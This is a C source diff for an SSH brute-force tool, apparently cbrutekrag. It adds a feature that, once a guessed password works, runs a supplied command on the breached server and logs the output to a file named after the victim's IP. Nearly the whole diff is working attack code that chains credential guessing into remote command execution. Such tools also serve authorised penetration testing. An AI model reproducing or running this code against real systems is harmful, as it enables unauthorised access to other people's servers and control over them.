@@ -22,14 +22,59 @@ SOFTWARE.
 
 #include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <arpa/inet.h>
 
 #include <libssh/libssh.h>
 
+#include "bruteforce_ssh.h"
 #include "cbrutekrag.h"
 #include "log.h"
 #include "progressbar.h"
 
 int g_timeout;
+
+char *get_output_filename_for_session(ssh_session session)
+{
+	struct sockaddr_storage tmp;
+	struct sockaddr_in *sock;
+	unsigned int len = 100;
+	char ip[100] = "\0";
+
+	getpeername(ssh_get_fd(session), (struct sockaddr *)&tmp, &len);
+	sock = (struct sockaddr_in *)&tmp;
+	inet_ntop(AF_INET, &sock->sin_addr, ip, len);
+
+	char *filename = malloc(strlen(ip) + 9); // _cmd.log + null-terminator
+
+	if (filename == NULL) {
+		exit(EXIT_FAILURE);
+	}
+
+	strcpy(filename, ip);
+	strcat(filename, "_cmd.log");
+
+	return filename;
+}
+
+FILE *get_output_file_for_session(ssh_session session)
+{
+	FILE *output = NULL;
+	char *filename = get_output_filename_for_session(session);
+
+	output = fopen(filename, "a");
+
+	if (output == NULL) {
+		log_error("Error opening output file. (%s)", filename);
+		exit(EXIT_FAILURE);
+	}
+
+	free(filename);
+
+	return output;
+}
 
 int bruteforce_ssh_login(btkg_context_t *context, const char *hostname,
 			 uint16_t port, const char *username,
@@ -101,6 +146,17 @@ int bruteforce_ssh_login(btkg_context_t *context, const char *hostname,
 	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
 		r = ssh_userauth_password(my_ssh_session, NULL, password);
 		if (r == SSH_AUTH_SUCCESS) {
+			if (context->command != NULL) {
+				int cx = bruteforce_ssh_execute_command(
+					my_ssh_session, context->command);
+				if (cx != SSH_OK) {
+					log_error(
+						"[!] %s:%d - Cannot execute command.",
+						hostname, port);
+				} else {
+					log_info("\033[32m[+]\033[0m %s:%d - Command executed successfully.", hostname, port);
+				}
+			}
 			ssh_disconnect(my_ssh_session);
 			ssh_free(my_ssh_session);
 
@@ -141,4 +197,75 @@ int bruteforce_ssh_try_login(btkg_context_t *context, const char *hostname,
 	}
 
 	return ret;
+}
+
+int bruteforce_ssh_execute_command(ssh_session session, const char *command)
+{
+	ssh_channel channel;
+	int ret;
+
+	/** Create channel */
+
+	channel = ssh_channel_new(session);
+
+	if (channel == NULL) {
+		return SSH_ERROR;
+	}
+
+	/** Open a session */
+
+	ret = ssh_channel_open_session(channel);
+	if (ret != SSH_OK) {
+		log_error("Cannot open channel.");
+		ssh_channel_free(channel);
+		return ret;
+	}
+
+	/** Send command */
+
+	ret = ssh_channel_request_exec(channel, command);
+	if (ret != SSH_OK) {
+		ssh_channel_close(channel);
+		ssh_channel_free(channel);
+		return ret;
+	}
+
+	/** Read the output */
+
+	FILE *output = NULL;
+	char buffer[256];
+	int nbytes;
+	nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+
+	output = get_output_file_for_session(session);
+
+	while (nbytes > 0) {
+		if (fwrite(buffer, 1, (size_t)nbytes, output) !=
+		    (size_t)nbytes) {
+			goto exit_with_errors;
+		}
+		nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+	}
+
+	if (nbytes < 0) {
+		goto exit_with_errors;
+	}
+
+	if (output != NULL) {
+		fclose(output);
+	}
+	ssh_channel_send_eof(channel);
+	ssh_channel_close(channel);
+	ssh_channel_free(channel);
+
+	return SSH_OK;
+
+exit_with_errors:
+	if (output != NULL) {
+		fclose(output);
+	}
+	ssh_channel_close(channel);
+	ssh_channel_free(channel);
+
+	return SSH_ERROR;
 }
